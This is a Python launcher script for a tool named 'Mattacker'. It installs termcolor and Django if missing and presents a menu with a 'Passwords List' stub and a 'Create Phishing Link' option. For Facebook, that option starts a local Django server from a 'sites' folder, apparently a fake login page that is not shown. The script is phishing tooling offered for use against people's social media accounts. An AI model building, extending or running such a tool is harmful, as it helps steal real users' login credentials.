import os
import time
from sys import platform
list_packages = []
try:
    from termcolor import colored
except ModuleNotFoundError:
    if platform == "win32":
        os.system("pip install termcolor")
    else:
        os.system("pip3 install termcolor")
    from termcolor import colored
    
try:
    import django
except ModuleNotFoundError:
    list_packages.append("django")
    
print(colored("\nstart script.....\n","blue"))
time.sleep(1)
print(colored("Author : Moosa Raheel","light_green"))
time.sleep(1)
print(colored("\nchecking packages.....","green"))
time.sleep(1)
if (list_packages):
    print(colored("\nInstalling.....","blue"))
    time.sleep(1)
    for i in list_packages:
        if platform == "win32":
            os.system(f"pip install {i}")
        else:
            os.system(f"pip3 install {i}")
            
    else:
        print(colored("Package install successfully.....","blue"))
        
time.sleep(1)
print(colored("\nhttps://github.com/moosa-raheel","light_blue"))


os.system("clear")
welcome = "  Mattacker  "
heading = welcome.center(len(welcome)+16, "*")
print("\n"+colored(heading,"cyan")+"\n")

def link():
    print(colored("\nchoose your plattform\n","cyan"))
    print(colored("1) ","yellow"),colored("Facebook","green"))
    print(colored("2) ","yellow"),colored("Exit","green"))
    
    while True:
        print(colored("\nEnter your choice : ","red"),end=" ")
        choice = input()
        try:
            choice = int(choice)
        except:
            print(colored("\nInvalid Input......\n","red"))
            continue
        if(choice==1):
            if platform == "win32":
                os.system("python sites/manage.py runserver")
            else:
                os.system("python3 sites/manage.py runserver")
            exit()
        elif(choice==2):
            exit()
        else:
            print(colored("\nInvalid Input......\n","red"))
            
            
print(colored("1) ","yellow"),colored("Passwords List","green"))
print(colored("2) ","yellow"),colored("Create Phishing Link","green"))
print(colored("3) ","yellow"),colored("Exit\n","green"))


while True:
    print(colored("Enter your choice : ","yellow"),end="")
    ch = input()
    try:
        ch = int(ch)
    except:
        print(colored("\nInvalid Input......\n","red"))
        continue
    
    if ch==1:
        print("password list")
        break
    elif ch==2:
        link()
        break
    elif ch==3:
        exit()
    else:
        print(colored("\nInvalid Input......\n","red"))

